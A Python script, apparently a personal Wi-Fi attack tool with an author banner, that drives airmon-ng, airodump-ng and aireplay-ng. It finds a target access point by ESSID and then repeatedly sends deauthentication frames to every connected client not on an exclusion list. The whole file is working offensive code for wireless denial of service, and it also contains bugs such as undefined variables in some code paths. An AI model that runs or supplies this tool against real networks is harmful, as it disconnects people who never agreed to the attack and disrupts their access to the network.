import os
import time
import subprocess

def enable_monitor_mode(interface):
    os.system("airmon-ng check kill")
    """Enable monitor mode on the specified interface."""
    os.system(f"airmon-ng start {interface}")

def disable_monitor_mode(interface):
    """Disable monitor mode on the specified interface."""
    os.system(f"airmon-ng stop {interface}")

def set_wifi_channel(interface, channel):
    """
    Set the Wi-Fi card to listen on a specific channel.
    
    Args:
        interface (str): The wireless interface in monitor mode.
        channel (int): The channel number to set.
        
    Returns:
        bool: True if successful, False otherwise.
    """
    try:
        # Construct the command to set the channel
        command = ["sudo", "iwconfig", interface, "channel", str(channel)]
        
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"Successfully set {interface} to channel {channel}.")
            return True
        else:
            print(f"Failed to set channel. Error: {result.stderr}")
            return False
    
    except Exception as e:
        print(f"An error occurred: {e}")
        return False


def get_bssid_and_channel_from_essid(essid, interface):
    """
    Find the BSSID and channel of a network using its ESSID via airodump-ng.

    Args:
        essid (str): The ESSID of the target network.
        interface (str): The wireless interface in monitor mode.

    Returns:
        tuple: A tuple containing the BSSID (str) and channel (int), or (None, None) if not found.
    """
    print(f"Scanning for network ESSID: {essid}")
    try:
        # Run airodump-ng and output to a temporary CSV file
        os.system(f"airodump-ng -w temp_scan --output-format csv {interface}mon 2>/dev/null")
        
        # Read the CSV file to find the BSSID and channel
        with open("temp_scan-01.csv", "r") as f:
            for line in f.readlines():
                fields = line.split(",")
                if len(fields) > 13:
                    bssid = fields[0].strip()
                    channel = fields[3].strip()
                    detected_essid = fields[13].strip()
                    if detected_essid == essid:
                        print(f"Found BSSID for ESSID '{essid}': {bssid}, Channel: {channel}")
                        set_wifi_channel(interface_mon, channel)
                        print("Wifi card now listening on channel: " + channel)
                        return bssid, int(channel)
        
        print(f"ESSID '{essid}' not found.")
        return None, None
    finally:
        # Clean up the temporary CSV file
        if os.path.exists("temp_scan-01.csv"):
            os.remove("temp_scan-01.csv")

def deauth(target_mac, ap_mac, interface, channel):
    try:
        # Construct the aireplay-ng command
        command = [
            "aireplay-ng",
            "-0", "1",  # Number of deauth packets to send
            "-a", ap_mac,     # AP MAC address
            "-c", target_mac, # Target MAC address
            interface         # Network interface
        ]
        
        print(f"Executing: {' '.join(command)}")
        
        # Execute the command and capture the output
        result = subprocess.run(command, capture_output=True, text=True)
        
        # Print stdout and stderr for debugging
        print(result.stdout)
        print(result.stderr)
        
        # Check if the command succeeded
        if result.returncode == 0:
            print("Deauthentication packets sent successfully.")
        else:
            print("Error sending deauthentication packets. Check the logs above.")
    
    except Exception as e:
        print(f"An error occurred: {e}")

def scan_for_clients(ap_bssid, interface, exclusions, channel):
    """Continuously scan for connected clients and deauth them."""
    print(f"Scanning for clients connected to AP {ap_bssid}...")
    command = [
        "airodump-ng",
        "--bssid", ap_bssid,
        "-w", "temp_clients",
        "--output-format", "csv",
        interface, "--channel", str(channel)
    ]
    try:
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

        while True:
            if os.path.exists("temp_clients-01.csv"):
                with open("temp_clients-01.csv", "r") as f:
                    lines = f.readlines()
                    for line in lines:
                        fields = line.split(",")
                        if len(fields) > 0:
                            client_mac = fields[0].strip()
                            if client_mac and client_mac not in exclusions and len(client_mac) == 17:
                                print(f"Deauthenticating client: {client_mac}")
                                deauth(client_mac, ap_bssid, interface, channel)
                time.sleep(5)
    except Exception as e:
        print(e)
    except KeyboardInterrupt:
        print("\nStopping scan and cleanup...")
    finally:
        if process:
            process.terminate()
        if os.path.exists("temp_clients-01.csv"):
            os.remove("temp_clients-01.csv")

if __name__ == "__main__":
    print(
r'''
      _        _         _______  __                       _                        
     / \      (_)       |_   __ \[  |                     / |_                      
    / _ \     __   _ .--. | |__) || |--.   ,--.   _ .--. `| |-' .--.   _ .--..--.   
   / ___ \   [  | [ `/'`\]|  ___/ | .-. | `'_\ : [ `.-. | | | / .'`\ \[ `.-. .-. |  
 _/ /   \ \_  | |  | |   _| |_    | | | | // | |, | | | | | |,| \__. | | | | | | |  
|____| |____|[___][___] |_____|  [___]|__]\'-;__/[___||__]\__/ '.__.' [___||__||__] 
                                                                                    
Made By:- Harsh Raj Singhania
Email: raj.harshraut@gmail.com
''')
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
    target = input("Enter the AP's ESSID or BSSID to target: ")
    exclusions = input("Enter MAC addresses to exclude (comma-separated): ").split(",")
    exclusions = [mac.strip() for mac in exclusions]

    try:
        enable_monitor_mode(interface)
        interface_mon = f"{interface}mon"

        # Resolve ESSID to BSSID if needed
        if ":" in target:  # Likely a BSSID
            ap_bssid = target
        else:
            ap_bssid, channel = get_bssid_and_channel_from_essid(target, interface)
            if not ap_bssid:
                print("Failed to find BSSID. Exiting.")
                exit(1)

        scan_for_clients(ap_bssid, interface_mon, exclusions, channel)
    finally:
        disable_monitor_mode(interface_mon)
        os.system("service wpa_supplicant start")
        os.system("NetworkManager")
        print("Monitor mode disabled. Exiting.")

